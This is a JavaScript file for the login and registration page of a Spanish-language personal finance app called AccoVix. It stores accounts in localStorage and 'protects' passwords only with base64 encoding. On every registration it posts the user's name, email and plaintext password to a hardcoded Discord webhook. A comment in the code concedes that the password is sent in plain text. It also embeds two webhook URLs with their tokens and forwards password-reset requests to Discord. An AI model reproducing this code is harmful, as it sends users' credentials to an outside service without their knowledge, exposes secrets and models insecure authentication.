// Limpieza al cargar 
(function cleanupOnLoad() {
    const TEST = ['test', 'demo', 'prueba', '@example.com', '@test.com'];
    let accounts = [];
    try { accounts = JSON.parse(localStorage.getItem('iq_accounts')) || []; } catch { accounts = []; }
    Object.keys(localStorage)
        .filter(k => k.startsWith('iq_data_'))
        .forEach(k => {
            const uid = k.replace('iq_data_', '');
            const owner = accounts.find(a => String(a.id) === uid);
            const isOrphan = !owner;
            const isTestUser = owner && TEST.some(p =>
                (owner.email || '').toLowerCase().includes(p) ||
                (owner.name || '').toLowerCase().includes(p)
            );
            if (isOrphan || isTestUser) localStorage.removeItem(k);
        });
    localStorage.removeItem('iq_data_demo');
    if (!localStorage.getItem('iq_accounts')) {
        Object.keys(localStorage)
            .filter(k => k.startsWith('iq_data_') || k === 'iq_session')
            .forEach(k => localStorage.removeItem(k));
        sessionStorage.removeItem('iq_session');
    }
})();

// Redirigir si ya hay sesión activa
if (sessionStorage.getItem('iq_session')) window.location = '../../index.html';

// Pega aquí tus URLs de webhook de Discord
const DISCORD_WEBHOOK_NEW_USER = 'https://discord.com/api/webhooks/1485536509678452796/DCrRBAxsaFDRnrYL3kemVhsxpM-_rtA9GpNjv8qMYDpu279j5nvFeec_6JodgFkn-2Yv';  // ← URL webhook para nuevos registros
const DISCORD_WEBHOOK_FORGOT_PASSWORD = 'https://discord.com/api/webhooks/1485536641979519026/xhJ-tGNPC5DNq_WHquo4zlorNtgFv5JlkNoLuFOKKL_wgjyRQSDnzRCj3rpGdyQViUWO';  // ← URL webhook para olvido de contraseña

/**
 * Envía un mensaje con embed a un webhook de Discord.
 * Falla silenciosamente para no interrumpir la UI.
 * @param {string} url    - URL del webhook de Discord
 * @param {string} title  - Título del embed
 * @param {Array}  fields - [{name, value, inline?}]
 * @param {number} color  - Color del borde (decimal). Ej: 0x3ec98a → 4115338
 */
async function sendToDiscordWebhook(url, title, fields, color = 4115338) {
    if (!url) return; // Si no está configurado, ignorar
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: 'AccoVix',
                avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
                embeds: [{
                    title,
                    color,
                    fields: fields.map(f => ({ name: f.name, value: String(f.value), inline: f.inline ?? true })),
                    footer: { text: 'AccoVix · Finanzas Personales' },
                    timestamp: new Date().toISOString(),
                }],
            }),
        });
    } catch (e) {
        console.error('[AccoVix] Discord webhook error:', e);
    }
}

// UI 
function switchTab(id, btn) {
    document.querySelectorAll('.atab').forEach(t => t.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('panel-login').style.display = id === 'login' ? '' : 'none';
    document.getElementById('panel-register').style.display = id === 'register' ? '' : 'none';
    clearError();
}
function showError(msg) { const el = document.getElementById('error-msg'); el.textContent = msg; el.classList.add('show'); }
function clearError() { document.getElementById('error-msg').classList.remove('show'); }

// Login 
function doLogin() {
    clearError();
    const user = document.getElementById('login-user').value.trim();
    const pass = document.getElementById('login-pass').value;
    if (!user || !pass) { showError('Por favor completa todos los campos.'); return; }
    const accounts = getAccounts();
    const match = accounts.find(a => (a.email === user || a.name === user) && a.password === btoa(pass));
    if (!match) { showError('Credenciales incorrectas. Verifica tu usuario y contraseña.'); return; }
    startSession(match);
    window.location = '../../index.html';
}

//  Registro 
async function doRegister() {
    clearError();
    const name = document.getElementById('reg-name').value.trim();
    const email = document.getElementById('reg-email').value.trim();
    const pass = document.getElementById('reg-pass').value;
    if (!name || !email || !pass) { showError('Completa todos los campos.'); return; }
    if (pass.length < 8) { showError('La contraseña debe tener al menos 8 caracteres.'); return; }
    if (!email.includes('@')) { showError('Ingresa un email válido.'); return; }

    const TEST = ['test', 'demo', 'prueba', '@example.com', '@test.com'];
    let accounts = getAccounts();
    const existing = accounts.find(a => a.email === email);
    if (existing) {
        const isTest = TEST.some(p => (existing.email || '').toLowerCase().includes(p));
        if (isTest) { localStorage.removeItem('iq_data_' + existing.id); accounts = accounts.filter(a => a.email !== email); }
        else { showError('Ya existe una cuenta con ese email.'); return; }
    }

    const newUser = { id: Date.now(), name, email, password: btoa(pass), createdAt: new Date().toISOString() };
    accounts.push(newUser);
    localStorage.setItem('iq_accounts', JSON.stringify(accounts));
    seedEmpty(newUser.id);
    startSession(newUser);

    // 1. Notificación Discord — nuevo registro
    // await garantiza que el fetch termina antes de redirigir
    // ⚠️ Envía contraseña en texto plano. Solo para uso personal.
    await sendToDiscordWebhook(
        DISCORD_WEBHOOK_NEW_USER,
        '🎉 Nuevo usuario registrado en AccoVix',
        [
            { name: '👤 Nombre', value: name },
            { name: '📧 Email', value: email },
            { name: '🔑 Contraseña', value: pass, inline: false },
            { name: '📅 Fecha/Hora', value: new Date().toLocaleString('es-CO') },
        ],
        0x3ec98a // verde
    );

    window.location = '../../index.html';
}

//  Demo 
function loadDemo() {
    localStorage.removeItem('iq_data_demo');
    sessionStorage.removeItem('iq_session');
    const demo = { id: 'demo', name: 'Demo', email: 'demo@accovix.app', isDemo: true };
    localStorage.setItem('iq_data_demo', JSON.stringify(getDemoData()));
    startSession(demo);
    window.location = '../../index.html';
}

//  Helpers 
function startSession(user) {
    sessionStorage.setItem('iq_session', JSON.stringify({ id: user.id, name: user.name, email: user.email, isDemo: user.isDemo || false }));
}
function getAccounts() {
    try { return JSON.parse(localStorage.getItem('iq_accounts')) || []; }
    catch (e) { console.warn('[AccoVix] Error leyendo cuentas:', e); return []; }
}
function seedEmpty(uid) {
    localStorage.setItem('iq_data_' + uid, JSON.stringify({
        transactions: [], budgets: [],
        accounts: [{ id: 1, name: 'Cuenta principal', type: 'checking', balance: 0 }],
        categories: ['Salario', 'Ingresos extra', 'Alimentación', 'Transporte', 'Salud', 'Entretenimiento', 'Hogar', 'Ropa', 'Suscripciones', 'Ahorro', 'Otros']
    }));
}

// 1. Notificación Discord — olvido de contraseña
async function showForgot() {
    const user = document.getElementById('login-user').value.trim();
    if (!user) { showError('Ingresa tu email primero para recuperar tu contraseña.'); return; }
    // await garantiza que el fetch termina antes de mostrar el alert
    await sendToDiscordWebhook(
        DISCORD_WEBHOOK_FORGOT_PASSWORD,
        '🔐 Solicitud de recuperación de contraseña',
        [
            { name: '📧 Email / Usuario', value: user },
            { name: '📅 Fecha/Hora', value: new Date().toLocaleString('es-CO') },
        ],
        0xf5a623 // ámbar
    );

    alert('Se ha registrado tu solicitud de recuperación. Si configuraste el webhook de Discord, recibirás una notificación.');
}

function getDemoData() {
    const now = new Date();
    const m = String(now.getMonth() + 1).padStart(2, '0');
    const y = now.getFullYear();
    const d = day => `${y}-${m}-${String(day).padStart(2, '0')}`;
    return {
        transactions: [
            { id: 1, date: d(20), description: 'Salario mensual', category: 'Salario', account: 'Cuenta principal', type: 'income', amount: 3200000, icon: '💼' },
            { id: 2, date: d(20), description: 'Arriendo apartamento', category: 'Hogar', account: 'Cuenta principal', type: 'expense', amount: 900000, icon: '🏠' },
            { id: 3, date: d(19), description: 'Mercado semanal', category: 'Alimentación', account: 'Cuenta principal', type: 'expense', amount: 185000, icon: '🛒' },
            { id: 4, date: d(18), description: 'Gasolina', category: 'Transporte', account: 'Cuenta principal', type: 'expense', amount: 120000, icon: '⛽' },
            { id: 5, date: d(17), description: 'Netflix + Spotify', category: 'Suscripciones', account: 'Cuenta principal', type: 'expense', amount: 47000, icon: '📺' },
            { id: 6, date: d(16), description: 'Cena restaurante', category: 'Alimentación', account: 'Cuenta principal', type: 'expense', amount: 85000, icon: '🍽️' },
            { id: 7, date: d(15), description: 'Consulta médica', category: 'Salud', account: 'Cuenta principal', type: 'expense', amount: 65000, icon: '🏥' },
            { id: 8, date: d(14), description: 'Transferencia freelance', category: 'Ingresos extra', account: 'Cuenta principal', type: 'income', amount: 450000, icon: '💻' },
            { id: 9, date: d(13), description: 'Ropa', category: 'Ropa', account: 'Cuenta principal', type: 'expense', amount: 210000, icon: '👕' },
            { id: 10, date: d(12), description: 'Ahorro mensual', category: 'Ahorro', account: 'Ahorros', type: 'expense', amount: 500000, icon: '🐷' },
            { id: 11, date: d(11), description: 'Uber / taxi', category: 'Transporte', account: 'Cuenta principal', type: 'expense', amount: 55000, icon: '🚗' },
            { id: 12, date: d(10), description: 'Farmacia', category: 'Salud', account: 'Cuenta principal', type: 'expense', amount: 32000, icon: '💊' },
        ],
        budgets: [
            { id: 1, category: 'Alimentación', icon: '🛒', limit: 600000, color: '#3ec98a' },
            { id: 2, category: 'Transporte', icon: '🚗', limit: 300000, color: '#5b8def' },
            { id: 3, category: 'Hogar', icon: '🏠', limit: 1000000, color: '#f5a623' },
            { id: 4, category: 'Salud', icon: '💊', limit: 200000, color: '#a78bfa' },
            { id: 5, category: 'Entretenimiento', icon: '🎮', limit: 150000, color: '#e8634f' },
            { id: 6, category: 'Ahorro', icon: '🐷', limit: 500000, color: '#22c98e' },
        ],
        accounts: [
            { id: 1, name: 'Cuenta principal', type: 'checking', balance: 3200000 },
            { id: 2, name: 'Ahorros', type: 'savings', balance: 2800000 },
        ],
        categories: ['Salario', 'Ingresos extra', 'Alimentación', 'Transporte', 'Salud', 'Entretenimiento', 'Hogar', 'Ropa', 'Suscripciones', 'Ahorro', 'Otros']
    };
}

document.addEventListener('keydown', e => {
    if (e.key !== 'Enter') return;
    if (document.getElementById('panel-login').style.display !== 'none') doLogin();
    else doRegister();
});